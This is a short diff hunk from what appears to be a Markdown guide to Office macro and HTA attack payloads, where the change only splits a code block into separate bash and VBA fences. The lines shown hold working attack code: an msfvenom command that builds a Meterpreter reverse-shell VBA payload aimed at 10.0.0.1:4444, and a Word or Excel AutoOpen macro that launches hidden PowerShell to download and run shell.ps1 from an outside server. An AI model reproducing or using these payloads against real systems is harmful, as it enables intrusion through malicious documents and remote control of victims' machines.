@@ -78,7 +78,9 @@ HTA files are HTML applications executed by `mshta.exe`, a built-in Windows comp
 ```bash
 # Generate VBA macro payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba-psh -o macro.txt
+```
 
+```vb
 # Manual VBA shell launcher (paste into Word/Excel VBA editor via Alt+F11 -> ThisDocument)
 Sub AutoOpen()
     Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')""", vbHide
